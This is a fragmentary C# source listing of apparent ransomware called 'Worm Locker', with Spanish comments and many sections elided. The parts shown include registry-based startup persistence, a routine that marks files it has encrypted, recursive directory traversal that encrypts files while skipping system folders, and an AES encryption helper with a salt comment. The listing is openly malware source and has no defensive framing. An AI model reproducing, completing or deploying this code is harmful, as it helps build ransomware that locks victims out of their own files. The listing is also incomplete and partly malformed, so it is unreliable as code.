...

{
    class Program
    {
        ...
        static void Main()
        {
            ...
            //  System.Diagnostics.Process.Start(@"C:\\Program Files\\\wom.exe);
        ...
        static void SetStartup()
        {
            ...
            if (rk.GetValue("Worm Locker") == null && !Application.ExecutablePath.Contains("rundll32.exe"))
            {
                rk.SetValue(" Worm Locker", "\"" + Application.ExecutablePath + "\"");
            }
        ...
        public static void EncryptFile(string fileUnencrypted)
        {
            ...
            using (var stream = new FileStream(fileUnencrypted, FileMode.Append))
            {
                if (stream.CanWrite)
                {
                    byte[] mark = Encoding.UTF8.GetBytes("Worm");
        ...
        // Procesar todos los archivos en el directorio pasado, recurrir a cualquier directorio
        // que se encuentran y procesan los archivos que contienen.
        // acción 1 = cifrar, 0 = descifrar
        public static void ProcessDirectory(string targetDirectory, int action, string password)
        {
            // Procesar la lista de archivos que se encuentran en el directorio.
            ...
            // Recurrir a subdirectorios de este directorio.
            string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
            foreach (string subdirectory in subdirectoryEntries)
                try
                {   // No acceda a los archivos de programa de Windows ni a los archivos temporales de Internet. Y otros 
        ...
        {
            byte[] mark = Encoding.ASCII.GetBytes("Worm");
        ...
        // Para cada archivo encontrado, haga lo siguiente.
        ...
        public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            ...
            // Pon tu sal aquí, cámbiala para que se adapte a tu sabor:
            // Los bytes salt deben tener al menos 8 bytes.
